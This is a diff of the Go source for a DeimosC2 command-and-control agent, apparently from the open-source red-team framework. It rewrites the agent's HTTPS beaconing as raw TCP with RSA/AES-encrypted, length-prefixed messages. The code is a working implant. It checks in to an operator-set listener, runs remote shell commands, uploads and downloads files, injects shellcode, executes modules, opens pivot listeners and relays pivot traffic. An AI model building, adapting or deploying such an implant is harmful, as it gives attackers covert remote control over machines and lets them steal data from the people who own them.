@@ -1,15 +1,12 @@
 package main
 
 import (
-	"bytes"
 	"crypto/rand"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/hex"
 	"encoding/json"
-	"io/ioutil"
 	"net"
-	"net/http"
 	"net/rpc"
 	"net/rpc/jsonrpc"
 	"os"
@@ -17,8 +14,7 @@ import (
 	"runtime"
 	"strconv"
 	mrand "math/rand"
-	{{HIDDEN_CRYPT}}
-	{{HIDDEN_ESNI_IMPORT}}
+
 	"github.com/DeimosC2/DeimosC2/agents/resources/agentfunctions"
 	"github.com/DeimosC2/DeimosC2/agents/resources/selfdestruction"
 	"github.com/DeimosC2/DeimosC2/agents/resources/shellinject"
@@ -28,35 +24,29 @@ import (
 	"github.com/DeimosC2/DeimosC2/lib/modulescommon"
 )
 
-var rpcUp = false    //Check this to know if the RPC server was spun up or not
+var rpcUp = false
 var pList agentfunctions.PivotList //Holds the pivot listener
-var key string      //Key of the agent
-var host = "{{HOST}}"               //Host of the listener
-var port = "{{PORT}}"           //Port of the listener
-var delay = {{DELAY}}        //Sleep delay
-var jitter = {{JITTER}}       //%jitter in communications
-var eol = "{{EOL}}"             //Time to die, Format: 2019-06-30
-var liveHours = "{{LIVEHOURS}}" //Times of the day this can operate, Format: 05:00-21:00
+var key string
+var ip = "{{HOST}}"
+var port = "{{PORT}}"
+var delay = {{DELAY}}
+var jitter = {{JITTER}}
+var eol = "{{EOL}}"
+var liveHours = "{{LIVEHOURS}}"
 var pubKey []byte
 var stringPubKey = `{{PUBKEY}}`
-var firsttime = "/{{FIRSTTIME}}"
-var checkin = "/{{CHECKIN}}"
-var moduleloc = "/{{MODULELOC}}"
-var pivotloc = "/{{PIVOTLOC}}"
 var modPort int
-{{HIDDEN_FRONTDOMAIN}}
-{{HIDDEN_ACTDOMAIN}}
-{{HIDDEN_HTTPCLIENT}}
 
 //ModData is used for RPC
 type ModData int
 
 func main() {
-	{{HIDDEN_CODE_BLOCK_MAIN}}
+	//convert the cert to a byte array
+	pubKey = []byte(stringPubKey)
 
 	for {
 		agentfunctions.CheckTime(liveHours)
-		if key == "" || key == "000000000000000000000000000000000000"{
+		if key == "" || key == "000000000000000000000000000000000000" {
 			connect("init", "")
 		} else {
 			go connect("check_in", "")
@@ -69,58 +59,89 @@ func main() {
 //Makes the connection to the listener
 func connect(connType string, data string) {
 	defer logging.TheRecovery()
-
+	conn, err := net.Dial("tcp", ip+":"+port)
+	if err != nil {
+		agentfunctions.ErrHandling(err.Error())
+		return
+	}
 	switch connType {
 	case "init":
 		msg := agentfunctions.FirstTime(key)
-		key = string(sendMsg(firsttime, msg))
+		aesKey := sendMsg(conn, msg, []byte("0"))
+		key = recvMsg(conn, aesKey)
 	case "check_in":
-		checkIn()
+		checkIn(conn)
 	}
 }
 
 //sendMsg takes in an array of bytes and sends it to the listener
-func sendMsg(msgType string, data []byte) []byte {
-
-	var aesKey []byte
+func sendMsg(conn net.Conn, data []byte, cType []byte) []byte {
+	msgLen := make([]byte, 8)
 	var fullMessage []byte
 	pub := crypto.BytesToPublicKey(pubKey)
+	aesKey := make([]byte, 32)
 	if key == "" {
 		key = "000000000000000000000000000000000000"
-	} 
-	aesKey = make([]byte, 32)
+	}
 	_, _ = rand.Read(aesKey)
-	named := []byte(key)
+	named := append(cType, key...)
 	combined := append(named, aesKey...)
 	encPub := crypto.EncryptWithPublicKey(combined, pub)
 	encMsg := crypto.Encrypt(data, aesKey)
 	final := append(encPub, encMsg...)
-	fullMessage = final
-	r, err := http.Post(("https://" + {{HIDDEN_HOST}} + ":" + port + msgType), "application/json", bytes.NewBuffer(fullMessage))
+	binary.BigEndian.PutUint64(msgLen, uint64(len(final)))
+	fullMessage = append(msgLen, final...)
+	conn.Write(fullMessage)
+	return aesKey
+}
+
+func recvMsg(conn net.Conn, aesKey []byte) string {
+	//read the first 4 bytes which are the length
+	rawMsgLen := make([]byte, 8)
+	_, err := conn.Read(rawMsgLen)
 	if err != nil {
 		agentfunctions.ErrHandling(err.Error())
 	}
-	defer r.Body.Close()
-	if r.StatusCode == http.StatusOK {
-		bodyBytes, err := ioutil.ReadAll(r.Body)
+
+	message := make([]byte, 0)
+	readBuffer := make([]byte, 1024)
+	readLength := uint64(0)
+	for {
+		n, err := conn.Read(readBuffer)
+		message = append(message, readBuffer[:n]...)
+		readLength += uint64(n)
+		if readLength == binary.BigEndian.Uint64(rawMsgLen) {
+			break
+		}
 		if err != nil {
 			agentfunctions.ErrHandling(err.Error())
 		}
-		decMsg := crypto.Decrypt(bodyBytes, aesKey)
-
-		return decMsg
 	}
-	return nil
+
+	decMsg := crypto.Decrypt(message, aesKey)
+	var p = &aesKey
+	*p = nil
+	return (string(decMsg))
+}
+
+func getKey(conn net.Conn) {
+	//Set First AES Key
+	aesKey := make([]byte, 32)
+	_, _ = rand.Read(aesKey)
+
+	//Send just the msgtype and a random AES key to the listener
+	sendMsg(conn, aesKey, []byte("0"))
+
+	//Get agent key
+	key = recvMsg(conn, aesKey)
 }
 
 //Sends the job output and then revieves new jobs to execute
-func checkIn() {
+func checkIn(conn net.Conn) {
 	agentfunctions.AllOutput.Mutex.Lock()
-
 	msg, err := json.Marshal(&agentfunctions.AllOutput.List)
 	if err != nil {
 		agentfunctions.ErrHandling(err.Error())
-
 	}
 	//deletes all the keys
 	for key := range agentfunctions.AllOutput.List {
@@ -131,11 +152,12 @@ func checkIn() {
 	if len(msg) == 0 {
 		msg = append(msg, []byte("{}")...)
 	}
-
+	//Sends the job output
+	aesKey := sendMsg(conn, msg, []byte("2"))
 	//Recv new jobs
-	newJobs := sendMsg(checkin, msg)
+	newJobs := recvMsg(conn, aesKey)
 	var j []agentfunctions.AgentJob
-	err = json.Unmarshal(newJobs, &j)
+	err = json.Unmarshal([]byte(newJobs), &j)
 	if err != nil {
 		agentfunctions.ErrHandling(err.Error())
 
@@ -147,7 +169,6 @@ func checkIn() {
 
 func jobExecute(j []agentfunctions.AgentJob) {
 	for _, value := range j {
-
 		switch value.JobType {
 		case "shell":
 			go agentfunctions.Shell(value.Arguments, false)
@@ -155,10 +176,10 @@ func jobExecute(j []agentfunctions.AgentJob) {
 			go agentfunctions.Download(value.Arguments[0])
 		case "upload":
 			go agentfunctions.Upload(value.Arguments[0], value.Arguments[1], value.Arguments[2])
-		case "options":
-			go options(value.Arguments[0], value.Arguments[1])
 		case "fileBrowser":
 			go agentfunctions.AgentFileBrowsers(value.Arguments[0])
+		case "options":
+			go options(value.Arguments[0], value.Arguments[1])
 		case "shellInject":
 			go shellinject.ShellInject(value.Arguments[0], value.Arguments[1])
 		case "module":
@@ -199,7 +220,6 @@ func jobExecute(j []agentfunctions.AgentJob) {
 		case "pivotKill":
 			pList.ListChan <- true
 			pList = agentfunctions.PivotList{}//reset the var so listener can be made started again
-
 		case "kill":
 			agentfunctions.Kill()
 			connect("check_in", "")
@@ -209,7 +229,7 @@ func jobExecute(j []agentfunctions.AgentJob) {
 	}
 }
 
-//NEED TO ADD VALIDATION HERE
+//TODO ADD VALIDATION HERE
 func options(o string, n string) {
 	switch o {
 	case "jitter":
@@ -255,6 +275,7 @@ func execMod(moduleName string, execType string, moduleData string) {
 		cwd, _ := os.Getwd()
 		env := runtime.GOOS
 
+		//TODO randomize this 
 		var filename string
 		if env == "windows" {
 			filename = moduleName + ".exe"
@@ -269,19 +290,20 @@ func execMod(moduleName string, execType string, moduleData string) {
 			cmd.Start()
 		}
 	case "inject":
-		
 		sc := hex.EncodeToString([]byte(binary))
 		//Inject the reflective dll into the process
 		shellinject.ShellInject(sc, "")
 	}
+
 }
 
 //Starts the RPC server for modules
 func moduleServer() {
-	modPort = mrand.Intn(65535 - 49152) + 49152
+    modPort = mrand.Intn(65535 - 49152) + 49152
 	modRPC := new(ModData)
 	rpc.Register(modRPC)
 	rpc.HandleHTTP()
+	//TODO Port needs to be randomized in the future, hard coded right now.
 	var l net.Listener
 	var e error
 	for {
@@ -292,12 +314,14 @@ func moduleServer() {
 		}
 		modPort++
 	}
+
 	//will need to go this so that it runs in the background.
 	rpcUp = true
 	for {
 		conn, err := l.Accept()
 		if err != nil {
 			agentfunctions.ErrHandling(err.Error())
+			return
 		}
 
 		go rpc.ServeCodec(jsonrpc.NewServerCodec(conn))
@@ -309,7 +333,8 @@ func (t *ModData) ReturnData(data modulescommon.ModuleCom, reply *int) error {
 	data.AgentKey = key
 	msg, err := json.Marshal(data)
 	if err != nil {
-		agentfunctions.ErrHandling(err.Error())
+		agentfunctions.ErrHandling( err.Error())
+		return nil
 
 	}
 	agentfunctions.AllOutput.Mutex.Lock()
@@ -325,12 +350,17 @@ func (t *ModData) ReturnData(data modulescommon.ModuleCom, reply *int) error {
 //SendData -> modules use this to send data back to the server
 func (t *ModData) SendData(data *modulescommon.ModuleCom, reply *int) error {
 	data.AgentKey = key
+	conn, err := net.Dial("tcp", ip+":"+port)
+	if err != nil {
+		agentfunctions.ErrHandling(err.Error())
+		return nil
+	}
 	msg, err := json.Marshal(data)
 	if err != nil {
 		agentfunctions.ErrHandling(err.Error())
-
 	}
-	sendMsg(moduleloc, msg)
+
+	sendMsg(conn, msg, []byte("6"))
 	return nil
 }
 
@@ -377,15 +407,21 @@ func handleConnection(conn net.Conn, pr []byte) {
 	case "0":
 		//Send just the msgtype and a random AES key to the listener
 		//need a new conn for this call
+		newConn, err := net.Dial("tcp", ip+":"+port)
+		if err != nil {
+			agentfunctions.ErrHandling(err.Error())
+			return
+		}
 		job.AgentKey = key //Done so i know the OG link
 		msg, err := json.Marshal(job)
 		if err != nil {
 			agentfunctions.ErrHandling(err.Error())
 			return
 		}
-		response := string(sendMsg(pivotloc, msg))
+		NewAESKey := sendMsg(newConn, msg, []byte("3"))
 		//Get agent key
 		// if we recieve a sleep order then do that
+		response := recvMsg(newConn, NewAESKey)
 		listenerSendMsg(conn, []byte(response), aesKey)
 
 		agentfunctions.AllPivotJobs.Mutex.Lock()
@@ -419,20 +455,31 @@ func handleConnection(conn net.Conn, pr []byte) {
 		agentfunctions.AllPivotJobs.Mutex.Unlock()
 
 	case "3": //Straight pass through of pivot data
-		response := sendMsg(pivotloc, []byte(data))
+		newConn, err := net.Dial("tcp", ip+":"+port)
+		if err != nil {
+			agentfunctions.ErrHandling(err.Error())
+			return
+		}
+		NewAESKey := sendMsg(newConn, []byte(data), []byte("3"))
+		response := recvMsg(newConn, NewAESKey)
 		listenerSendMsg(conn, []byte(response), aesKey)
 	case "6":
+		newConn, err := net.Dial("tcp", ip+":"+port)
+		if err != nil {
+			agentfunctions.ErrHandling(err.Error())
+			return
+		}
 		msg, err := json.Marshal(job)
 		if err != nil {
 			agentfunctions.ErrHandling(err.Error())
 			return
 		}
-		response := string(sendMsg(pivotloc, msg))
+		NewAESKey := sendMsg(newConn, msg, []byte("3"))
+		response := recvMsg(newConn, NewAESKey)
 		listenerSendMsg(conn, []byte(response), aesKey)
 	case "7":
 		// conn.Write(Dropper(data, newListener.Key))
 		// conn.Close()
-
 	default:
 		agentfunctions.ErrHandling("How did you get here?")
 		return
